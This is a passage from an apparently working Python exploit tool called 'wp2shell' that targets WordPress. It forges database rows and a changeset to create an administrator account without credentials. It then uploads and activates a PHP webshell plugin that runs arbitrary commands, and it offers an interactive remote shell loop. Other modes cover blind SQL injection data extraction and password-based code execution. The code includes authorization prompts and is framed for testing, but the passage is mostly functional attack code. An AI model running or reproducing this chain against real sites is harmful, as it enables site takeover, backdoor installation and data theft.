                    "nav_menu_term_id": 0, "_invalid": False,
                },
                "type": "nav_menu_item", "user_id": admin_id,
            }
        }, separators=(",", ":"))

        poisoned = (
            self._post_row(0,
                '[embed width="500" height="750"]%s[/embed]' % embed_urls[1],
                "trigger", "publish", "trigger", 0, "post"),
            self._post_row(cache_ids[0], changeset, "changeset", "future",
                str(uuid.uuid4()), outer, "customize_changeset"),
            self._post_row(outer, "outer", "outer", "draft",
                "outer", cache_ids[0], "post"),
            self._post_row(cache_ids[1], "", "cache", "publish",
                "cache", cache_ids[0], "post"),
            self._post_row(nav_id, "nav", "nav", "publish",
                "nav", cache_ids[2], "nav_menu_item"),
            self._post_row(cache_ids[2], "parse", "parse", "parse",
                "parse", inner_id, "request"),
            self._post_row(inner_id, "inner", "inner", "draft",
                "inner", cache_ids[2], "post"),
        )
        new_admin = {"username": username, "email": email,
                     "password": password, "roles": ["administrator"]}

        sys.stderr.write("[4/6] forging changeset elevation + re-entrant "
                         "parse_request, creating administrator ...\n")
        self._forge(poisoned, extra_requests=[
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
        ])

        # 5. login and deploy self-cleaning webshell plugin
        sys.stderr.write("[+] administrator created: %s\n" % email)
        sys.stderr.write("[5/6] logging in and deploying self-cleaning webshell ...\n")

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sh = [urllib.request.HTTPSHandler(context=ctx),
              urllib.request.HTTPCookieProcessor(cookiejar.CookieJar()), _KeepPost()]
        if self._proxy:
            sh.append(urllib.request.ProxyHandler(
                {"http": self._proxy, "https": self._proxy}))
        else:
            sh.append(urllib.request.ProxyHandler({}))
        session = urllib.request.build_opener(*sh)

        session.open(urllib.request.Request(
            self.base + "/wp-login.php",
            headers={"User-Agent": self.UA}), timeout=15).read()
        session.open(urllib.request.Request(
            self.base + "/wp-login.php",
            data=urllib.parse.urlencode({
                "log": username, "pwd": password, "wp-submit": "Log In",
                "redirect_to": self.base + "/wp-admin/",
                "testcookie": "1"}).encode(),
            headers={"User-Agent": self.UA},
            method="POST"), timeout=30).read()

        with session.open(urllib.request.Request(
                self.base + "/wp-admin/users.php",
                headers={"User-Agent": self.UA}), timeout=30) as resp:
            users_page = resp.read().decode(errors="replace")
        if username not in users_page:
            raise RuntimeError("admin login failed (user not created?)")

        slug = "wp2shell-%s" % secrets.token_hex(6)
        route = secrets.token_hex(12)
        marker = secrets.token_hex(12)
        # The webshell persists across calls so an interactive session can run
        # many commands; it self-destructs only when called with rm=1 (cleanup()).
        php = (
            "<?php\n"
            "/* Plugin Name: %s */\n"
            "add_action('rest_api_init', function () {\n"
            "    register_rest_route('wp2shell/v1', '/%s', array(\n"
            "        'methods' => 'POST', 'permission_callback' => '__return_true',\n"
            "        'callback' => function ($r) {\n"
            "            if ($r->get_param('rm')) {\n"
            "                require_once ABSPATH.'wp-admin/includes/plugin.php';\n"
            "                deactivate_plugins(plugin_basename(__FILE__), true);\n"
            "                @unlink(__FILE__);\n"
            "                return new WP_REST_Response(array(\n"
            "                    'marker' => '%s', 'output' => 'WP2SHELL_REMOVED'));\n"
            "            }\n"
            "            ob_start(); passthru(base64_decode($r->get_param('c')).' 2>&1');\n"
            "            $o = ob_get_clean();\n"
            "            return new WP_REST_Response(array(\n"
            "                'marker' => '%s', 'output' => $o));\n"
            "        },\n"
            "    ));\n"
            "});\n" % (slug, route, marker, marker)).encode()

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("%s/%s.php" % (slug, slug), php)

        with session.open(urllib.request.Request(
                self.base + "/wp-admin/plugin-install.php?tab=upload",
                headers={"User-Agent": self.UA}), timeout=30) as resp:
            page = resp.read().decode(errors="replace")
        nonce = re.search(r'name="_wpnonce" value="([^"]+)"', page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found")

        boundary = "----wp2shell%s" % secrets.token_hex(12)
        body = b"".join((
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"_wpnonce\"\r\n\r\n%s\r\n" % (boundary, nonce.group(1))).encode(),
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"_wp_http_referer\"\r\n\r\n"
             "/wp-admin/plugin-install.php?tab=upload\r\n" % boundary).encode(),
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"pluginzip\"; filename=\"%s.zip\"\r\n"
             "Content-Type: application/zip\r\n\r\n" % (boundary, slug)).encode(),
            buf.getvalue(),
            ("\r\n--%s--\r\n" % boundary).encode(),
        ))
        with session.open(urllib.request.Request(
                self.base + "/wp-admin/update.php?action=upload-plugin",
                data=body,
                headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary,
                         "User-Agent": self.UA},
                method="POST"), timeout=60) as resp:
            install_page = resp.read().decode(errors="replace")

        activate = re.search(
            r'href="([^"]*plugins\.php\?action=activate[^"]*)"', install_page)
        if not activate:
            raise RuntimeError("plugin install/activation link not found")
        session.open(urllib.request.Request(
            urllib.parse.urljoin(self.base + "/wp-admin/",
                                html_mod.unescape(activate.group(1))),
            headers={"User-Agent": self.UA}), timeout=30).read()

        shell_url = self.base + "/?rest_route=/wp2shell/v1/%s" % route

        def _call(params):
            req = urllib.request.Request(
                shell_url, data=json.dumps(params).encode(),
                headers={"Content-Type": "application/json", "User-Agent": self.UA},
                method="POST")
            with self.opener.open(req, timeout=60) as resp:
                result = json.loads(resp.read())
            if result.get("marker") != marker:
                raise RuntimeError("webshell did not respond correctly")
            return result["output"]

        def run(command):
            return _call({"c": base64.b64encode(command.encode()).decode()})

        def cleanup():
            try:
                _call({"rm": "1"})
            except Exception:
                pass

        return username, password, run, cleanup

    def exploit(self, command):
        """One-shot pre-auth RCE: deploy, run one command, self-clean.
        Returns (username, password, command_output)."""
        username, password, run, cleanup = self.deploy()
        try:
            output = run(command)
        finally:
            cleanup()
        return username, password, output


def _is_local(url):
    host = urllib.parse.urlparse(url).hostname or ""
    return host in ("localhost", "127.0.0.1", "::1", "[::1]")


def _confirm_authorization(url, action):
    """Interactive y/N gate shown before any code-execution payload is sent.
    Returns True only on an explicit yes; aborts on EOF (non-interactive stdin)
    so piped/automated runs must opt in with -y/--yes instead."""
    sys.stderr.write(
        "\n[!] authorization check\n"
        "    about to %s\n"
        "    target: %s\n"
        "    this executes code and changes state on the target -- only continue\n"
        "    if you own it or have explicit written authorization to test it.\n"
        % (action, url))
    try:
        ans = input("    proceed? [y/N] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        sys.stderr.write("\n")
        return False
    return ans in ("y", "yes")


def _interactive_shell(run, host):
    """Drive a web command loop over a run(command)->output callable. Tracks the
    working directory client-side (like `--shell -i`); not a PTY, so job control
    and TTY-only programs will not behave like a real terminal."""
    print("[+] interactive command loop on %s (type 'exit' or Ctrl-D to quit)" % host)
    print("[*] note: web command loop, not a PTY; job control and TTY-only tools "
          "will not work")
    cwd = "/var/www/html"
    try:
        out = run("pwd")
        if out.strip():
            cwd = out.strip().splitlines()[-1]
    except Exception:
        pass
    while True:
        try:
            line = input("wp2shell:%s$ " % cwd).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        if line in ("exit", "quit"):
            break
        if line == "pwd":
            print(cwd)
            continue
        if line.startswith("cd"):
            try:
                parts = shlex.split(line)
            except ValueError as e:
                print("cd: %s" % e)
                continue
            target = parts[1] if len(parts) > 1 else "~"
            cmd = "cd %s && cd %s && pwd" % (shlex.quote(cwd), shlex.quote(target))
            try:
                out = run(cmd)
            except (RuntimeError, urllib.error.URLError) as e:
                print("cd: %s" % e)
                continue
            if out.strip():
                cwd = out.strip().splitlines()[-1]
            continue
        try:
            out = run("cd %s && %s" % (shlex.quote(cwd), line))
        except (RuntimeError, urllib.error.URLError) as e:
            print("[-] %s" % e)
            continue
        if out:
            print(out, end="" if out.endswith("\n") else "\n")


def cmd_rce(args):
    url = args.url if "://" in args.url else "http://" + args.url
    if not _is_local(url) and not args.authorized:
        print("[-] refusing remote target without --authorized.\n"
              "    Only test assets you own or are explicitly authorized to test.",
              file=sys.stderr)
        return 2
    t = PreAuthRCE(url, timeout=max(args.timeout, 30), proxy=args.proxy,
                   sleep=args.sleep, route=args.route)
    sys.stderr.write("[*] target: %s\n" % url)
    sys.stderr.write("[1/6] confirming blind SQLi (time-based differential) ...\n")
    try:
        det = t.detect(rounds=args.rounds)
    except urllib.error.URLError as e:
        print("[-] %s" % e.reason)
        return 2
    if not det["vulnerable"]:
        print("[-] not vulnerable (no time differential: fast=%.3fs slow=%.3fs)"
              % (det["fast"], det["slow"]))
        return 1
    sys.stderr.write("[+] SQLi confirmed (fast=%.3fs slow=%.3fs)\n"
                     % (det["fast"], det["slow"]))

    if not args.yes and not _confirm_authorization(
            url, "forge an admin and run the pre-auth RCE chain"):
        print("[-] aborted: authorization not confirmed")
        return 2

    try:
        user, pw, run, cleanup = t.deploy()
    except (RuntimeError, urllib.error.URLError) as e:
        print("[-] exploit failed: %s" % e)
        return 2
    print("[+] forged administrator: %s : %s" % (user, pw))

    host = urllib.parse.urlparse(url).hostname or ""
    rc = 0
    try:
        if args.interactive:
            _interactive_shell(run, host)
        else:
            sys.stderr.write("[6/6] executing command: %s\n" % args.cmd)
            output = run(args.cmd)
            print("[+] command output:\n")
            print(output, end="" if output.endswith("\n") else "\n")
    except (RuntimeError, urllib.error.URLError) as e:
        print("[-] command failed: %s" % e)
        rc = 2
    finally:
        if args.no_cleanup:
            sys.stderr.write("[!] --no-cleanup: webshell left in place on target\n")
        else:
            cleanup()
            sys.stderr.write("[*] cleanup: removed dropped webshell plugin\n")
    return rc


# ==========================================================================
MODES = {
    "scan": cmd_scan, "check": cmd_check, "read": cmd_read,
    "shell": cmd_shell, "root-prereq": cmd_root_prereq, "rce": cmd_rce,
}


def main():
    ap = argparse.ArgumentParser(
        description="wp2shell exposure scanner + validation PoC "
                    "(authorized testing only)",
        epilog="Exactly one mode flag is required. Examples:\n"
               "  wp2shell.py --scan host1 host2 -f hosts.txt -j\n"
               "  wp2shell.py --check http://127.0.0.1:8080\n"
               "  wp2shell.py --read http://127.0.0.1:8080 --preset users\n"
               "  wp2shell.py --shell http://127.0.0.1:8080 --password s3cr3t --cmd id\n"
               "  wp2shell.py --shell http://127.0.0.1:8080 --password s3cr3t -i\n"
               "  wp2shell.py --rce http://127.0.0.1:8080 --cmd id\n"
               "  wp2shell.py --rce http://127.0.0.1:8080 -i\n"
               "  wp2shell.py --root-prereq http://127.0.0.1:8080 --password s3cr3t",
        formatter_class=argparse.RawDescriptionHelpFormatter)

    # mode selection: exactly one, as a flag instead of a positional subcommand
    mode = ap.add_mutually_exclusive_group(required=True)
    mode.add_argument("--scan", action="store_const", dest="mode", const="scan",
                      help="non-destructive exposure check (fingerprint + batch route)")
    mode.add_argument("--check", action="store_const", dest="mode", const="check",
                      help="confirm blind SQLi (non-destructive payload)")
    mode.add_argument("--read", action="store_const", dest="mode", const="read",
                      help="extract data via blind SQLi")
    mode.add_argument("--shell", action="store_const", dest="mode", const="shell",
                      help="RCE chain using a cracked admin password")
    mode.add_argument("--rce", action="store_const", dest="mode", const="rce",
                      help="credential-less pre-auth RCE (no password needed)")
    mode.add_argument("--root-prereq", action="store_const", dest="mode",
                      const="root-prereq",
                      help="benign shell-to-root prerequisite check; does not run LPE")

    ap.add_argument("targets", nargs="*",
                    help="target URL (single, for all modes) or host list (--scan)")

    # scan options
    ap.add_argument("-f", "--file", help="file with one host per line (--scan)")
    ap.add_argument("-j", "--json", action="store_true", help="JSON output (--scan)")
    ap.add_argument("-t", "--threads", type=int, default=10,
                    help="scan concurrency (--scan)")
    # blind-SQLi options (--check / --read)
    ap.add_argument("--prefix", default="wp_", help="DB table prefix (default wp_)")
    ap.add_argument("--delay", type=float, default=DEFAULT_DELAY,
                    help="injected SLEEP seconds for --check/--read oracle")
    ap.add_argument("--repeats", type=int, default=1,
                    help="median of N probes per bit (raise on noisy links)")
    # --read options
    ap.add_argument("--preset", default="users",
                    help="version|database|db_user|users|siteurl (--read)")
    ap.add_argument("--expr", help="raw SQL scalar expression to extract (--read)")
    ap.add_argument("--max-len", type=int, default=128, help="max extracted length (--read)")
    # --shell / --root-prereq / --rce options
    ap.add_argument("--user", default="admin", help="admin username (--shell/--root-prereq)")
    ap.add_argument("--password",
                    help="plaintext admin password (--shell/--root-prereq; crack from --read)")
    ap.add_argument("--cmd", default="id", help="command to run (--shell/--rce)")
    ap.add_argument("-i", "--interactive", action="store_true",
                    help="interactive web command loop (--shell/--rce)")
    ap.add_argument("--no-cleanup", action="store_true",
                    help="leave the dropped plugin in place (lab only)")
    ap.add_argument("-y", "--yes", action="store_true",
                    help="skip the interactive authorization prompt "
                         "(--shell/--rce/--root-prereq)")
    # --rce timing / transport options
    ap.add_argument("--sleep", type=float, default=4.0,
                    help="injected SLEEP seconds for --rce detect (default 4)")
    ap.add_argument("--rounds", type=int, default=3,
                    help="median over N probes for --rce detect (default 3)")
    ap.add_argument("--route", choices=("auto", "rest-route", "wp-json"),
                    default="auto", help="batch route form (--rce)")
    ap.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 (Burp) (--rce)")
    ap.add_argument("--authorized", action="store_true",
                    help="assert authorization for a remote --rce target")
    ap.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)

    args = ap.parse_args()

    _banner()

    # map positional targets onto the attributes the handlers expect
    args.hosts = list(args.targets)
    if args.mode == "scan":
        args.url = None
    elif len(args.targets) == 1:
        args.url = args.targets[0]
    else:
        ap.error("--%s takes exactly one target URL" % args.mode)

    if args.mode in ("shell", "root-prereq") and not args.password:
        ap.error("--%s requires --password (crack the hash from --read)" % args.mode)

    try:
        sys.exit(MODES[args.mode](args))
    except urllib.error.URLError as e:
        print("[-] request error: %s" % e)
        sys.exit(4)


if __name__ == "__main__":
    main()
